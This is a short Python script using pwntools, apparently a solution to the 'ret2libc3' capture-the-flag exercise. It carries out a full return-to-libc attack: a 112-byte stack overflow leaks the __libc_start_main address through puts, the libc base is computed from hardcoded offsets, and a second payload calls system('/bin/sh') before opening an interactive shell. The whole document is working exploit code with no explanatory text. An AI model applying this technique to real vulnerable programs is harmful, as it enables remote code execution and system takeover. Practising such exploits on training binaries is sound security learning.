from pwn import *
from LibcSearcher import *
#context(log_level="debug",arch="i386",os="linux")
#context(log_level="debug",os="linux")
p = process("./ret2libc3")
elf = ELF('./ret2libc3')
puts_plt = elf.plt['puts']
main = elf.symbols['_start']
libc_start_main_got = elf.got['__libc_start_main']
#libc_start_main_got = elf.got['puts']

payload1 =flat(['a'*112,puts_plt,main,libc_start_main_got])

p.sendlineafter('Can you find it !?',payload1)
addr = (u32(p.recv(4)))
libc = LibcSearcher("__libc_start_main", addr)
print("mainaddr:",hex(addr))
base = addr -0x021560#libc.dump("__libc_start_main")
system_addr = base +	0x48170 #libc.dump("system")
binsh_addr = base + 	0x1bd0f5#libc.dump("str_bin_sh")
payload2 = flat(['a'*112,system_addr,4*'a',binsh_addr])
print(payload2)
p.sendline(payload2)
p.interactive()

